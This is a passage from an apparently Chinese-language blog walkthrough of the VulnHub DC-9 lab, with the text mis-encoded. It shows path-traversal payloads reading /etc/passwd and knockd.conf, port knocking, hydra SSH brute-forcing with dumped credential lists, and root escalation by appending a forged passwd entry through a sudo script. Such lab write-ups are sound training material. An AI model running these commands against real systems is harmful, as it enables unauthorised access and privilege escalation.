¹æ®ç™»å½•é¡µé¢ï¼Œæ˜¯éœ€è¦ç®¡ç†å‘˜è´¦å·çš„ï¼Œå†æ ¹æ®<code>staff</code>ï¼Œçœ‹æ¥æˆ‘æ˜¯æ‰¾é”™è¡¨äº†</p><p><img src="/2022/08/29/vulnhub/image-20221103200743790.png" alt="image-20221103200743790"></p><p>äºæ˜¯æŒ‰ä¸Šé¢ä¸€æ ·æ­¥éª¤ï¼ŒæŸ¥çœ‹<code>Staff</code>æ•°æ®åº“é‡Œçš„ä¿¡æ¯</p><p><img src="/2022/08/29/vulnhub/image-20221103201409346.png" alt="image-20221103201409346"></p><p>æœç„¶åœ¨è¿™é‡Œ</p><blockquote><p><code>transorbital1</code><br>æˆ‘å¼€å§‹ä»¥ä¸ºæ˜¯å•¥å¯†é’¥ï¼Œç»“æœæ˜¯å¯†ç æ˜æ–‡ï¼Œéº»äº†</p><p>å½“ç„¶æ—¶é—´å……è¶³çš„å…„å¼Ÿå¯ä»¥hashcatè¯•è¯•ã€åç¬‘ã€‘</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221103202130464.png" alt="image-20221103202130464"></p><p>æˆåŠŸç™»å½•</p><h2 id="2-æ–‡ä»¶åŒ…å«"><a href="#2-æ–‡ä»¶åŒ…å«" class="headerlink" title="2.æ–‡ä»¶åŒ…å«"></a>2.æ–‡ä»¶åŒ…å«</h2><p>å‘ç°å¤šäº†ä¸¤ä¸ªé€‰é¡¹æ˜¯ï¼Œä¸€ä¸ªæ˜¯å¢åŠ ç”¨æˆ·ï¼Œå¦ä¸€ä¸ªæ˜¯ç™»å‡ºè´¦å·</p><p>ä½†æ˜¯æˆ‘çªç„¶å‘ç°</p><p>åº•ä¸‹è«åå¤šäº†ä¸€è¡Œå­—</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span> does not <span class="keyword">exist</span></span><br></pre></td></tr></table></figure><p>ï¼Ÿï¼Ÿï¼Ÿ</p><p>å“ªé‡Œæ¥çš„<code>file</code>ï¼Œçœ‹æ¥æ˜¯è¿›è¡Œäº†è¯»å–æ–‡ä»¶æ“ä½œï¼Œä½†æ˜¯æ–‡ä»¶å‚æ•°ä¸å­˜åœ¨</p><p>çŒœæµ‹å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p>äºæ˜¯æˆ‘ä»¬åœ¨<code>url</code>ååŠ ä¸Š<code>?file=</code>è¿›è¡Œæ–‡ä»¶åŒ…å«</p><blockquote><p><code>http://192.168.133.149/manage.php?file=../../../../../etc/passwd</code><br>è¿”å›åˆ°æ ¹ç›®å½•ä¸‹ï¼ŒåŒ…å«&#x2F;etcç›®å½•ä¸‹çš„passwdæ–‡ä»¶</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221103205431449.png" alt="image-20221103205431449"></p><p>ä½†è¿™é‡Œå¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œ</p><h2 id="3-ssh"><a href="#3-ssh" class="headerlink" title="3.ssh"></a>3.ssh</h2><h3 id="1ï¼‰-knockd"><a href="#1ï¼‰-knockd" class="headerlink" title="1ï¼‰ knockd"></a>1ï¼‰ knockd</h3><blockquote><p>åœ¨1920å¹´ä»£ï¼Œå½“ç¦ä»¤å¦‚ç«å¦‚è¼åœ°è¿›è¡Œæ—¶ï¼Œå¦‚æœæ‚¨æƒ³è¿›å…¥è¯´è¯çŠ¶æ€ï¼Œå°±å¿…é¡»çŸ¥é“ç§˜å¯†çš„æ•²é—¨å£°ï¼Œå¹¶æ­£ç¡®åœ°æ•²æ‰“å®ƒæ‰èƒ½è¿›å…¥å†…éƒ¨ã€‚</p><p>ç«¯å£æ•²é—¨æ˜¯ç°ä»£çš„ç­‰åŒç‰©ã€‚ å¦‚æœæ‚¨å¸Œæœ›äººä»¬å¯ä»¥è®¿é—®æ‚¨è®¡ç®—æœºä¸Šçš„æœåŠ¡ï¼Œä½†åˆä¸æƒ³å°†é˜²ç«å¢™æ‰“å¼€åˆ°<del>Internet</del>ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ç«¯å£æ–­å¼€åŠŸèƒ½ã€‚<br>å®ƒå…è®¸æ‚¨å…³é—­é˜²ç«å¢™ä¸Šå…è®¸ä¼ å…¥è¿æ¥çš„ç«¯å£ï¼Œå¹¶åœ¨è¿›è¡Œ<code>é¢„å…ˆå®‰æ’çš„è¿æ¥å°è¯•</code>æ–¹å¼æ—¶è‡ªåŠ¨æ‰“å¼€å®ƒä»¬ã€‚ è¿æ¥å°è¯•çš„é¡ºåºå……å½“ç§˜å¯†æ•²é—¨ã€‚ å¦ä¸€ä¸ªç§˜å¯†çš„æ•²é—¨å£°å…³é—­äº†æ¸¯å£ã€‚</p></blockquote><p>æˆ‘åœ¨å­¦ä¹ ç¬”è®°å†™æœ‰å…¶åŸç†ï¼Œå¯ä»¥çœ‹çœ‹ï¼Œæˆ‘ä¸åœ¨è¿™é‡Œèµ˜è¿°</p><p>å…ˆæŸ¥çœ‹æ•²é—¨é¡ºåº</p><blockquote><p><code>http://192.168.133.149/manage.php?file=../../../../../etc/knockd.conf</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221103213357210.png" alt="image-20221103213357210"></p><p>å‘ç°æ˜¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">7469</span>,<span class="number">8475</span>,<span class="number">9842</span></span><br></pre></td></tr></table></figure><p>æ•²ä¸€ä¸‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.133.149</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103214033662.png" alt="image-20221103214033662"></p><p>ç„¶åå†ç”¨<code>nmap</code>æ‰«ä¸€ä¸‹ï¼Œå‘ç°<code>22</code>ç«¯å£å¼€äº†</p><p><img src="/2022/08/29/vulnhub/image-20221103214022727.png" alt="image-20221103214022727"></p><h3 id="2ï¼‰-hydra"><a href="#2ï¼‰-hydra" class="headerlink" title="2ï¼‰ hydra"></a>2ï¼‰ hydra</h3><p>ç„¶åæˆ‘ä»¬ç”¨ä¹å¤´è›‡çˆ†ç ´ç™»å½•ä¸€ä¸‹<code>ssh</code></p><p>è‡³äºè´¦æˆ·å¯†ç å°±ç”¨æˆ‘ä»¬ä¹‹å‰<code>sql</code>æ³¨å…¥å¾—åˆ°çš„ç¬¬ä¸€ä¸ªçš„æ•°æ®</p><p><img src="/2022/08/29/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></p><blockquote><p>usernameï¼š<br><code>marym</code><br><code>julied</code><br><code>fredf</code><br><code>barneyr</code><br><code>tomc</code><br><code>jerrym</code><br><code>wilmaf</code><br><code>bettyr</code><br><code>chandlerb</code><br><code>joeyt</code><br><code>rachelg</code><br><code>rossg</code><br><code>monicag</code><br><code>phoebeb</code><br><code>scoots</code><br><code>janitor</code><br><code>janitor2</code></p></blockquote><blockquote><p>passwordï¼š<br><code>3kfs86sfd</code><br><code>468sfdfsd2</code><br><code>4sfd87sfd1</code><br><code>RocksOff</code><br><code>TC&amp;TheBoyz</code><br><code>B8m#48sd</code><br><code>Pebbles</code><br><code>BamBam01</code><br><code>UrAG0D!</code><br><code>Passw0rd</code><br><code>yN72#dsd</code><br><code>ILoveRachel</code><br><code>3248dsds7s</code><br><code>smellycats</code><br><code>YR3BVxxxw87</code><br><code>Ilovepeepee</code><br><code>Hawaii-Five-0</code></p></blockquote><p>æŠŠ<code>username</code>å’Œ<code>password</code>å¤åˆ¶åˆ°ä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­å»</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103215414559.png" alt="image-20221103215414559"></p><p>å‘ç°æœ‰ä¸‰ä¸ªå¯ä»¥ç™»å½•</p><blockquote><p>login: <code>chandlerb</code>   password: <code>UrAG0D!</code><br>login: <code>joeyt</code>   password: <code>Passw0rd</code><br>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p></blockquote><p>æˆ‘ä»¬å…ˆç™»å½•<code>janitor</code></p><blockquote><p>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221104165102940.png" alt="image-20221104165102940"></p><p>ç™»å½•æˆåŠŸ</p><h2 id="4-ææƒ"><a href="#4-ææƒ" class="headerlink" title="4.ææƒ"></a>4.ææƒ</h2><p>å…ˆæ‰§è¡Œ </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure><p>çœ‹çœ‹å½“å‰ç”¨æˆ·èƒ½ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œå“ªäº›å‘½ä»¤</p><p><img src="/2022/08/29/vulnhub/image-20221104165528505.png" alt="image-20221104165528505"></p><p>çœ‹æ¥æˆ‘ä»¬æ²¡æœ‰èµ„æ ¼</p><p>å†æ‰§è¡Œ</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">la</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å½“å‰ç”¨æˆ·ç›®å½•æ–‡ä»¶</p><p><img src="/2022/08/29/vulnhub/image-20221104165145529.png" alt="image-20221104165145529"></p><p>å‘ç°æœ‰ä¸ª</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">secrets-for-putin</span></span><br></pre></td></tr></table></figure><p>å¯èƒ½æœ‰ç®¡ç†å‘˜å¯†ç ä»€ä¹ˆçš„</p><p><img src="/2022/08/29/vulnhub/image-20221104165242513.png" alt="image-20221104165242513"></p><p>æœç„¶æœ‰ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ŒæŸ¥çœ‹</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span> passwords-found-<span class="keyword">on</span>-<span class="keyword">post</span>-it-<span class="keyword">notes</span>.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221104165331378.png" alt="image-20221104165331378"></p><p>åˆå¤šäº†å‡ ä¸ªå¯†ç </p><blockquote><p><code>BamBam01</code><br><code>Passw0rd</code><br><code>smellycats</code><br><code>P0Lic#10-4</code><br><code>B4-Tru3-001</code><br><code>4uGU5T-NiGHts</code></p></blockquote><p>æˆ‘ä»¬æŠŠè¿™ä¸ªè¡¥å……åˆ°æˆ‘ä»¬ä¹å¤´è›‡çˆ†ç ´çš„å¯†ç æœ¬é‡Œ</p><p>å†è¿›è¡Œçˆ†ç ´<code>ssh</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°å¤šäº†ä¸€ä¸ªæ–°çš„è´¦å·</p><p><img src="/2022/08/29/vulnhub/image-20221104165738669.png" alt="image-20221104165738669"></p><blockquote><p>login: <code>fredf</code>   password: <code>B4-Tru3-001</code></p></blockquote><p>æˆ‘ä»¬ç™»å½•<code>ssh</code>çœ‹çœ‹</p><p>å†æ‰§è¡Œ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221104165927452.png" alt="image-20221104165927452"></p><p>å‘ç°å…¶å¯ä»¥ä»¥æ— å¯†ç <code>root</code>æƒé™æ‰§è¡Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹è¯•è¯•</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221104170533241.png" alt="image-20221104170533241"></p><p>æç¤ºæˆ‘ä»¬æœ‰ä¸ªtest.pyæ­£åœ¨è¢«è¯»å–ä½¿ç”¨</p><p>æˆ‘ä»¬æ‰¾ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨å“ªé‡Œ</p><blockquote><p><code>find / -name &quot;test.py&quot; -type f 2&gt;/dev/null</code></p><p><code>-type</code> fä»£è¡¨ç±»å‹ä¸ºæ–‡ä»¶ï¼Œdä¸ºç›®å½•<br><code>2&gt;/dev/null</code>äº§ç”Ÿæ›´æ¸…æ™°çš„è¾“å‡ºï¼Œå› ä¸ºå®ƒä¼šä¸¢å¼ƒé”™è¯¯ï¼Œä¾‹å¦‚æƒé™é”™è¯¯</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221104170743086.png" alt="image-20221104170743086"></p><p>æˆ‘ä»¬åˆ°æ–‡ä»¶ç›®å½•ä¸‹æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p><p><img src="/2022/08/29/vulnhub/image-20221104170808449.png" alt="image-20221104170808449"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/<span class="keyword">python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.<span class="built_in">argv</span>) != <span class="number">3</span> :</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span> (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (<span class="keyword">f</span>.<span class="keyword">read</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(output)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><h3 id="pyè„šæœ¬åˆ©ç”¨"><a href="#pyè„šæœ¬åˆ©ç”¨" class="headerlink" title="pyè„šæœ¬åˆ©ç”¨"></a>pyè„šæœ¬åˆ©ç”¨</h3><p><code>è„šæœ¬æ¥å—äº†ä¸¤ä¸ªä½ç½®å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œé™„åŠ åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶çš„å†…å®¹ä¸­</code></p><p>å…¶å®å¦‚æœæˆ‘ä»¬æœ‰ä¿®æ”¹è„šæœ¬çš„æƒé™å°±å¥½äº†ï¼Œå¯ä»¥æ”¹æˆæ¶æ„è„šæœ¬ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰åœ¨è¿™ä¸ªç›®å½•å†™å…¥çš„æƒé™</p><p>äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ¢ä¸ªæ€è·¯ï¼Œå°±åˆ©ç”¨è„šæœ¬çš„æŠŠä¸€ä¸ªæ–‡æœ¬å†…å®¹é™„åŠ åˆ°å¦å¤–æ–‡æœ¬çš„èƒ½åŠ›ï¼Œä¿®æ”¹æˆ‘ä»¬æ— æ³•ä¿®æ”¹çš„æ–‡ä»¶ï¼Œæ¯”å¦‚<code>/etc/passwd</code></p><p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>/etc/passwd</code>é‡Œ<code>root</code>ç”¨æˆ·çš„æ ¼å¼</p><p><img src="/2022/08/29/vulnhub/image-20221104171635506.png" alt="image-20221104171635506"></p><p>æŒ‰è¿™ä¸ªæ ¼å¼æˆ‘ä»¬å†™ä¸€ä¸ªè‡ªå·±çš„</p><blockquote><p><code>ttoc::0:0:root:/root:/bin/bash</code><br>æˆ‘è¿™é‡Œè®¾ç½®çš„ç”¨æˆ·ttocå¯†ç ä¸ºç©º</p></blockquote><hr><h4 id="opensslåŠ ç›"><a href="#opensslåŠ ç›" class="headerlink" title="opensslåŠ ç›"></a><code>openssl</code>åŠ ç›</h4><p>å…¶å®è¿™é‡Œæ˜¯éœ€è¦ç»™æˆ‘ä»¬çœŸå‡çš„ç”¨æˆ·æ·»åŠ å¯†ç çš„</p><p>ä¸ç„¶æ˜¯é€šè¿‡ä¸äº†å¯†ç è¾“å…¥é‚£ä¸€ç¯ï¼Œé‚£é‡Œä¸å…è®¸å¯†ç ä¸ºç©º</p><p>æˆ‘ä»¬æ‰§è¡Œ</p><blockquote><p><code>openssl passwd -1 -salt salt password</code></p><p><code>-1</code>ä½¿ç”¨ä»€ä¹ˆå“ˆå¸Œç®—æ³•ã€‚åœ¨æˆ‘ä»¬çš„ç”¨ä¾‹ä¸­ï¼Œè¿™æ— å…³ç´§è¦ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨ MD5ï¼Œåœ¨ç°å®ä¸–ç•Œçš„ PT ä¸­åº”è¯¥é¿å…ä½¿ç”¨ MD5ï¼Œå› ä¸ºå®ƒä¸å®‰å…¨ã€‚</p><p><code>-salt</code> saltç”¨ä½œç›çš„å­—ç¬¦ä¸²ã€‚æˆ‘é€‰æ‹©å­—ç¬¦ä¸²ç›</p><p><code>password</code>æˆ‘ä»¬æƒ³ä½¿ç”¨çš„æ˜æ–‡å¯†ç </p></blockquote><p>å¾—åˆ°</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„å¦‚æœå¼€å§‹æ²¡åŠ å¯†ç å°±ä¼ å…¥&#x2F;etc&#x2F;passwdï¼Œåé¢ä¿®æ”¹åå†ä¼ ç”¨æˆ·ï¼Œåå­—ä¸èƒ½ç›¸åŒ</strong></p><hr><p>ä½†æ˜¯æ³¨æ„æˆ‘ä»¬å…¶å®åœ¨å¾ˆå¤šç›®å½•ä¸‹éƒ½æ²¡æœ‰å†™å…¥æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ç»å…¸ä½¿ç”¨</p><p><code>/tmp</code>ï¼Œä¸´æ—¶æ–‡ä»¶ç›®å½•ä¸‹çš„æƒé™ç®¡æ§ä¸€èˆ¬ä¸å¤§</p><p>äºæ˜¯æˆ‘ä»¬æŠŠæˆ‘ä»¬çš„å†…å®¹å†™å…¥<code>/tmp</code>ç›®å½•ä¸‹çš„<code>evil</code>æ–‡ä»¶ä¸­</p><blockquote><p><code>echo &#39;ttoc:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash&#39; &gt; /tmp/evil</code></p><p>*æ³¨æ„è¿™é‡Œéœ€è¦å•å¼•å·ï¼ŒåŒå¼•å·ä¼šæŠŠ$åé¢å‚æ•°å½“ä½œå˜é‡</p></blockquote><p>ç„¶åæˆ‘ä»¬å†æ‰§è¡Œ</p><blockquote><p><code>sudo /opt/devstuff/dist/test/test /tmp/evil /etc/passwd</code></p><p>æŠŠæˆ‘ä»¬åˆ›å»ºçš„ç”¨æˆ·rootæ·»åŠ åˆ°æ–‡æœ¬å»</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221104172732031.png" alt="image-20221104172732031"></p><p>æœ€åç™»å½•<code>ttoc</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">su ttoc</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221104173707687.png" alt="image-20221104173707687"></p><p>æˆåŠŸæå–</p><p>è¯»å–<code>flag</code></p><p><img src="/2022/08/29/vulnhub/image-20221104173836066.png" alt="image-20221104173836066"></p><blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•      â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â•šâ•â•â•šâ•â•â•šâ•â•</span><br><span class="line">â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—</span><br><span class="line">â•šâ•â•  â•šâ•â•â•â•â•šâ•â• â•šâ•â•â•â•â•â•â•šâ•â•â•â•â•â•â•     â•šâ•â•â•â•šâ•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•â•šâ•â•</span><br><span class="line"><span class="code">                                                                             </span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure><p><code>Congratulations - you have done well to get to this point.</code></p><p><code>Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</code><br><code>who have taken the time to complete the various DC challenges.</code></p><p><code>I also want to send out a big thank you to the various members of @m0tl3ycr3w .</code></p><p><code>They are an inspirational bunch of fellows.</code></p><p><code>Sure, they might smell a bit, but...just kidding.  :-)</code></p><p><code>Sadly, all things must come to an end, and this will be the last ever</code><br><code>challenge in the DC series.</code></p><p><code>So long, and thanks for all the fish.</code></p><p>æ„æ€æ˜¯ï¼š<br>æ­å–œ - ä½ å·²ç»å®Œæˆäº†è¿™ä¸€ç‚¹ã€‚</p><p>å¸Œæœ›ä½ å–œæ¬¢ DC-9ã€‚åªæ˜¯æƒ³å¯¹æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>ä»–ä»¬èŠ±æ—¶é—´å®Œæˆäº†å„ç§ DC æŒ‘æˆ˜ã€‚</p><p>æˆ‘è¿˜è¦å‘@m0tl3ycr3w çš„å„ä¸ªæˆå‘˜è¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢ã€‚</p><p>ä»–ä»¬æ˜¯ä¸€ç¾¤é¼“èˆäººå¿ƒçš„äººã€‚</p><p>å½“ç„¶ï¼Œå®ƒä»¬å¯èƒ½ä¼šé—»åˆ°ä¸€ç‚¹å‘³é“ï¼Œä½†æ˜¯â€¦â€¦å¼€ç©ç¬‘ã€‚ :-)</p><p>å¯æ‚²çš„æ˜¯ï¼Œä¸€åˆ‡éƒ½å¿…é¡»ç»“æŸï¼Œè¿™å°†æ˜¯æœ€åä¸€æ¬¡<br>DCç³»åˆ—ä¸­çš„æŒ‘æˆ˜ã€‚</p><p>è¿™ä¹ˆä¹…ï¼Œæ„Ÿè°¢æ‰€æœ‰çš„é±¼ã€‚</p></blockquote><p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p><p>ã€dcç³»åˆ—ç»“æŸï¼Œé˜…è¯»åˆ°æœ¬æ–‡çš„æœ‹å‹ï¼Œå¸Œæœ›å¯¹ä½ ä»¬æœ‰æ‰€å¸®åŠ©ã€‘</p><hr><h1 id="ELSE"><a href="#ELSE" class="headerlink" title="ELSE"></a>ELSE</h1><h1 id="ä¸€ã€DEATHNOTE-1-åˆçº§"><a href="#ä¸€ã€DEATHNOTE-1-åˆçº§" class="headerlink" title="ä¸€ã€DEATHNOTE: 1[åˆçº§]"></a>ä¸€ã€DEATHNOTE: 1[åˆçº§]</h1><p>åŸºæ‹‰å¥½å¸…ï¼Œå¿…é¡»æ‹¿è¿™ä¸ªå¼€å¤´ï¼Œç›´æ¥ææƒè¿›ä»–çš„å¿ƒã€ä¸æ˜¯å—é€šã€‘</p><p><img src="/2022/08/29/vulnhub/image-20221106151711523.png" alt="image-20221106151711523"></p><blockquote><p>hint:<br>ä¸è¦æµªè´¹å¤ªå¤šæ—¶é—´è·³å‡ºæ¡†æ¡†æ€è€ƒã€‚è¿™æ˜¯ä¸€ä¸ªç›´æˆªäº†å½“çš„ç›’å­ã€‚</p></blockquote><hr><p>æ‰¾è¿™ä¸ªé¶åœº<code>ip</code>ï¼Œå°±æŠŠæˆ‘å¡ä½äº†ï¼Œåé¢çœ‹åˆ°å¥½åƒè¿™ä¸ªé¶æœºå’Œ<code>vm</code>ä¸å…¼å®¹ï¼Œåªèƒ½ç”¨<code>vitrualbox</code></p><p>åé¢ä¸‹äº†ä¸ª<code>vitrualbox</code>æ‰æ‰¾åˆ°é¶æœº<code>ip</code></p><p><img src="/2022/08/29/vulnhub/image-20221108134734459.png" alt="image-20221108134734459"></p><p>ç„¶å<code>vm</code>ä¹Ÿæ¡¥æ¥ï¼Œå°±æ‰¾åˆ°äº†</p><p><img src="/2022/08/29/vulnhub/image-20221108190437827.png" alt="image-20221108190437827"></p><p>é¡ºå¸¦è¡¥å……ä¸¤ä¸ªæ‰«æå·¥å…·ã€ä½¿ç”¨è‡ªè¡Œ<code>-h</code>æŸ¥çœ‹ã€‘ã€æ„Ÿè§‰å’Œ<code>nmap</code>å·®ä¸å¤šã€‘</p><blockquote><p><code>arp-scan</code>æ˜¯Kali 